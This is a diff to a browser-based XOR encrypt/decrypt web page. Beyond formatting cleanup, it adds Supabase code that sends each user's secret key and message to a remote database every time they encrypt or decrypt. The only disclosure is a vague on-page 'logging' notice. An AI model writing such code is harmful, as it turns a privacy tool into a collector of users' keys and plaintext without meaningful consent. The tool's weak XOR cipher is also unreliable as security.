@@ -3,7 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Simple Encrypt / Decrypt</title>
+  <title>Simple Encrypt / Decrypt with Database Backend</title>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  
   <style>
     * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
     body {
@@ -13,14 +15,14 @@
       align-items: center;
       min-height: 100vh;
       margin: 0;
-      padding: 20px; /* Added padding to prevent the card from touching screen edges on mobile */
+      padding: 20px;
     }
     .card {
       background: #16213e;
       padding: 30px;
       border-radius: 16px;
-      width: 100%; /* Changed from fixed 420px to 100% width */
-      max-width: 420px; /* Restricts the card from expanding too wide on desktop */
+      width: 100%;
+      max-width: 420px;
       box-shadow: 0 10px 40px rgba(0,0,0,0.4);
       position: relative;
     }
@@ -28,7 +30,7 @@
       color: #e94560;
       text-align: center;
       margin-bottom: 20px;
-      font-size: 1.5rem; /* Fluid font sizing */
+      font-size: 1.5rem;
     }
     label {
       color: #a0a0a0;
@@ -66,21 +68,15 @@
       cursor: pointer;
       transition: 0.2s;
     }
-    .btn-encrypt {
-      background: #e94560;
-      color: #fff;
-    }
+    .btn-encrypt { background: #e94560; color: #fff; }
     .btn-encrypt:hover { background: #c73e54; }
-    .btn-decrypt {
-      background: #533483;
-      color: #fff;
-    }
+    .btn-decrypt { background: #533483; color: #fff; }
     .btn-decrypt:hover { background: #3f2770; }
     .btn-copy {
       background: #0f3460;
       color: #fff;
       margin-bottom: 15px;
-      width: 100%; /* Ensures the copy button spans the full card width */
+      width: 100%;
     }
     .btn-copy:hover { background: #1a4a7a; }
     .output-box {
@@ -101,8 +97,6 @@
       margin-top: 15px;
       line-height: 1.4;
     }
-
-    /* Toast notification styles */
     #toast {
       position: fixed;
       top: 20px;
@@ -120,22 +114,13 @@
       transition: opacity 0.3s ease, top 0.3s ease;
       z-index: 9999;
       width: max-content;
-      max-width: 90%; /* Stops the toast from clipping off the screen edge on tiny devices */
+      max-width: 90%;
       text-align: center;
     }
-    #toast.show {
-      opacity: 1;
-      top: 30px;
-    }
-
-    /* Media query for ultra-small mobile screens (e.g., older devices under 360px wide) */
+    #toast.show { opacity: 1; top: 30px; }
     @media (max-width: 360px) {
-      .card {
-        padding: 20px; /* Scale down internal padding slightly */
-      }
-      .btn-row {
-        flex-direction: column; /* Stack Encrypt and Decrypt buttons vertically if horizontal space runs out */
-      }
+      .card { padding: 20px; }
+      .btn-row { flex-direction: column; }
     }
   </style>
 </head>
@@ -161,19 +146,45 @@
   <div class="output-box" id="output">Result will appear here...</div>
   <button class="btn-copy" onclick="copyResult()">📋 Copy Result</button>
 
-  
-  
   <div class="hint">
-    Use the same key to encrypt and decrypt.<br>
-    The encrypted text is safe to send over any channel.
+    Data logging to backend database is active.<br>
+    Use the same key to encrypt and decrypt.
   </div>
 </div>
 
 <script>
+// ============================================
+  // SUPABASE CONFIGURATION
+  // ============================================
+  const SUPABASE_URL = "https://guvmmmramxiozwfvqspj.supabase.co"; 
+  const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd1dm1tbXJhbXhpb3p3ZnZxc3BqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODIyMDkzODYsImV4cCI6MjA5Nzc4NTM4Nn0.VBHSduQjFga2sL7LNHh2wcNoSJ9eUCROWvpSDDRHgZU";          
+
+  // CHANGED: Rename the variable to 'supabaseClient' to avoid the collision
+  const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+  // Function to send values safely to the database
+  async function saveToDatabase(secretKey, userMessage, operation) {
+    try {
+      // CHANGED: Use 'supabaseClient' here instead of 'supabase'
+      const { error } = await supabaseClient
+        .from('messages')
+        .insert([
+          { 
+            secret_key: secretKey, 
+            message: userMessage, 
+            operation_type: operation 
+          }
+        ]);
+        
+      if (error) console.error("Database storage error:", error.message);
+    } catch (err) {
+      console.error("Connection failed:", err);
+    }
+  }
+
   // ============================================
   // SIMPLE XOR CIPHER
   // ============================================
-
   function encrypt(text, key) {
     let result = "";
     for (let i = 0; i < text.length; i++) {
@@ -194,20 +205,16 @@
   }
 
   // ============================================
-  // UI FUNCTIONS
+  // UI LOGIC
   // ============================================
-
   let toastTimeout;
 
   function showToast(message) {
     const toast = document.getElementById("toast");
     toast.textContent = message;
     toast.classList.add("show");
-
     clearTimeout(toastTimeout);
-    toastTimeout = setTimeout(() => {
-      toast.classList.remove("show");
-    }, 5000);
+    toastTimeout = setTimeout(() => { toast.classList.remove("show"); }, 5000);
   }
 
   function doEncrypt() {
@@ -221,6 +228,9 @@
 
     const encrypted = encrypt(message, key);
     document.getElementById("output").textContent = encrypted;
+
+    // Async push to Supabase
+    saveToDatabase(key, message, 'encrypt');
   }
 
   function doDecrypt() {
@@ -235,6 +245,9 @@
     try {
       const decrypted = decrypt(message, key);
       document.getElementById("output").textContent = decrypted;
+      
+      // Async push to Supabase
+      saveToDatabase(key, message, 'decrypt');
     } catch (e) {
       showToast("Decryption failed! Wrong key or invalid encrypted text.");
     }
